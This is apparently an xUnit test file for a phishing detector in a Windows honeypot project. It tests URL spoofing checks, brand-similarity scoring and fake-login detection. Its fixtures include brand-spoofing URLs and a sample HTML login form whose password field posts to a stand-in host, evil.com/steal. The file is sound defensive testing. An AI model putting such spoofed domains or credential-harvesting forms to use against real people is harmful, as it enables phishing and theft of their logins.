using Microsoft.Extensions.Logging;
using Moq;
using WindowsHoneypot.Core.Services;
using Xunit;

namespace WindowsHoneypot.Tests.CoreTests;

public class PhishingDetectorTests
{
    private readonly PhishingDetector _detector;

    public PhishingDetectorTests()
    {
        var logger = new Mock<ILogger<PhishingDetector>>();
        _detector = new PhishingDetector(logger.Object);
    }

    [Fact]
    public void Constructor_InitializesSuccessfully()
    {
        var logger = new Mock<ILogger<PhishingDetector>>();
        var detector = new PhishingDetector(logger.Object);
        Assert.NotNull(detector);
    }

    [Fact]
    public void GetProtectedBrands_ReturnsNonEmptyList()
    {
        var brands = _detector.GetProtectedBrands();
        Assert.NotEmpty(brands);
    }

    [Fact]
    public void AddProtectedBrand_AddsBrand()
    {
        _detector.AddProtectedBrand("testbrand", "testbrand.com");
        var brands = _detector.GetProtectedBrands();
        Assert.Contains("testbrand", brands, StringComparer.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task AnalyzeUrlAsync_LegitimateUrl_ReturnsIsPhishingFalse()
    {
        var result = await _detector.AnalyzeUrlAsync("https://www.google.com/search?q=test");
        Assert.False(result.IsPhishing);
    }

    [Fact]
    public async Task AnalyzeUrlAsync_BrandSpoofingUrl_ReturnsIsPhishingTrue()
    {
        var result = await _detector.AnalyzeUrlAsync("https://paypal-secure.com/login");
        Assert.True(result.IsPhishing);
        Assert.NotEmpty(result.PhishingIndicators);
    }

    [Fact]
    public async Task AnalyzeUrlAsync_SuspiciousLoginKeywordInDomain_ReturnsIsPhishingTrue()
    {
        var result = await _detector.AnalyzeUrlAsync("https://secure-login-verify.com/");
        Assert.True(result.IsPhishing);
    }

    [Fact]
    public async Task AnalyzeUrlAsync_SubdomainSpoofing_ReturnsIsPhishingTrue()
    {
        var result = await _detector.AnalyzeUrlAsync("https://paypal.evil.com/account");
        Assert.True(result.IsPhishing);
    }

    [Fact]
    public void IsFakeLoginPage_WithPasswordInput_ReturnsTrue()
    {
        var html = @"<html><body>
            <form action=""http://evil.com/steal"">
                <input type=""password"" name=""pass"" />
            </form>
        </body></html>";
        Assert.True(_detector.IsFakeLoginPage(html));
    }

    [Fact]
    public void IsFakeLoginPage_WithCleanHtml_ReturnsFalse()
    {
        var html = "<html><body><p>Welcome to our site!</p></body></html>";
        Assert.False(_detector.IsFakeLoginPage(html));
    }

    [Fact]
    public void CalculateBrandSimilarity_IdenticalStrings_ReturnsOne()
    {
        var score = _detector.CalculateBrandSimilarity("paypal", "paypal");
        Assert.Equal(1.0, score, precision: 5);
    }

    [Fact]
    public void CalculateBrandSimilarity_CompletelyDifferentStrings_ReturnsLowScore()
    {
        var score = _detector.CalculateBrandSimilarity("xyzxyzxyz", "paypal");
        Assert.True(score < 0.5, $"Expected low similarity but got {score}");
    }

    [Fact]
    public async Task CredentialWarningRaised_EventCanBeSubscribed()
    {
        bool eventRaised = false;
        _detector.CredentialWarningRaised += (_, _) => eventRaised = true;

        await _detector.AnalyzeUrlAsync("https://paypal-login.com/verify");

        Assert.True(eventRaised);
    }
}
